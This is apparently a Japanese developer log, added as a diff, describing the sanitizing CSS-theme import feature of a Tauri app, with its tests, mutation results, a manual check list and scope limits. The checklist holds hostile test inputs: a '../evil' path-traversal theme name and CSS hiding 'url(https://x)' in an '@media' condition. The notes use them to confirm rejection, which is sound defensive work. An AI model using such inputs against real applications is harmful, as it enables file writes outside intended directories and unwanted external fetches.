+| `the_theme_origin_is_never_settable_from_the_frontend` | **`origin` はコマンド引数に一切現れない**。model.rs / security.md / task-board が揃ってそう主張していたが**守る仕組みが無かった**。⚠ 060c が text 版コマンドで `origin: String` を生やすのが最も自然な間違い | model.rs の doc |
+| `exactly_one_place_sanitizes_and_exactly_one_place_writes` | **保存経路もサニタイズ呼び出しも 1 か所**。⚠ 既存の `every_validation_is_actually_wired_in` は「呼ばれていること」しか見ないので、**2 本目の保存経路が増えたこと**は検出できなかった（060c 申し送りの核心） | `store_sanitized_css` の doc |
+
+加えて **冪等性テストを review② の新規則 3 つへ拡張**（`src()` / 非 ASCII 前置 / 許可形 `data:` プレリュード）。
+冪等は 060c の**機能要件**（「取得 CSS ＋ 保存済み CSS」を再度通す）なので、新規則が
+「1 周目と 2 周目で違う判断をする」形で入ると 060c で静かに壊れる。
+
+**ミューテーション（5 種すべて KILLED）**: `managed_path` の検証を外す ／ BOM 剥がしを外す ／
+入れ子境界を `>` → `>=` ／ bidi 範囲から U+202A..E を外す ／ `fs::write` を 2 か所にする。
+
+⚠ **frontend のテストは追加していない**（870 のまま）。060b は frontend を 1 行も変えておらず、
+生成された binding 3 本は**型宣言のみで実行時の振る舞いが無い**ため、テストを書いても
+「テストを通すためのテスト」にしかならない。UI の検査は 060d の領分。
+
+### ⚠ 実機確認は未実施（本人の手番）
+
+⚠ **1〜4・6・7 は 060d の完了条件へ移すこと**（コマンドを呼ぶ UI が 060d の領分なので、
+ここに置いたままだと忘れられる）。**5 と S-5 の実測は UI を待たずに今できる**（下記）。
+
+1. 依頼者の実サンプル CSS を取り込む → 保存され「**外部参照を 1 件除去**」が返る。
+   ⚠ **この時点で見た目は変わらない**（注入は 060d）。⚠⚠ さらに **060d まで作っても「書体しか効かない」**
+   （意匠の実体が除去した `@import` の中にある）＝**仕様どおりで、バグではない**。
+2. `~/Library/Application Support/<bundle-id>/themes/` に **`<uuid>.css` だけ**が増える（元ファイル名が使われていない）。
+3. テーマ名に `../evil` を入れても管理ディレクトリ外にファイルが出ない。
+4. 削除するとファイル実体も消える。もう一度削除してもアプリが落ちない（`NotFound` になるだけ）。
+5. `lsof -i` で外部 ESTABLISHED が増えない（本タスクは取得しない）。
+6. 拡張子違い（`.txt`）／256KB 超／`.css` にリネームしたバイナリ（PNG）が拒否される。
+7. `@media (min-width: calc(1px + url(https://x))){…}` を含む CSS が**拒否**され、
+   「@media などの条件部分に外部参照が…」という文言が出る（fail-closed の実機確認）。
+
+⚠ **コマンドを呼ぶ UI はまだ無い**（060d の領分）。1〜4・6・7 は 060d の実装後にまとめて確認する
+（タスクファイルへ移済み）。
+
+⚠⚠ **訂正: DevTools から `__TAURI__.core.invoke(...)` は使えない。**
+`tauri.conf.json` に **`app.withGlobalTauri` が無い＝既定の `false`** なので `window.__TAURI__` は注入されない
+（当初この節に書いた手順は誤り）。UI 無しでコマンドを叩くなら、次のどちらか:
+- **(a) Vite 経由で API を動的 import する**（設定を触らない）。コメビュ窓の DevTools で
+  `const { invoke } = await import("/node_modules/@tauri-apps/api/core.js")` を試す。
+- **(b) `tauri.conf.json` に `"withGlobalTauri": true` を一時的に足す**（確実だが
+  ⚠ **060b の「`tauri.conf.json` 差分ゼロ」要件に反するので、確認後に必ず戻すこと**）。
+→ 手間に見合わないので、**1〜7 はまとめて 060d で消化するのが現実的**。
+
+⚠⚠ **security-review② の S-5（フラグメント無し SVG data URI）の実測も本人の手番**。
+アプリ不要・5 分（手順は `sanitize.rs` の「既知の限界」に記載）。**結果はどちらでも本節に追記すること**
+——「実測して fetch されなかった」という記録が無いと、次の読者がまた同じ不安を抱えることになる。
+
+### やらないこと（線引き・再修正トリガー付き）
+
+- **外部 `@import` の取得**（060c）。本タスクは**除去する側**で、sidecar / `host-guard.ts` は差分ゼロ。
+- **セレクタ変換**（060a が表を持ち 060d が注入時に適用）。**保存するのは変換前の CSS**で、
+  Rust で再実装も参照もしない（契約テストが `cssCompat` / `rewriteSelector` の出現を止めている）。
+- **CSS の注入・テーマ切替 UI・プレビュー**（060d）。`<style>` を作る処理は 1 行も持ち込んでいない。
+- **CSS の構文チェック**（壊れた CSS はブラウザが無視するだけ）。
+- **汎用のファイル読み書きコマンド**・`fs` plugin・asset protocol。
+- **`origin='snapshot'` の生成**（060c だけが作る。コマンド引数には現れない）。
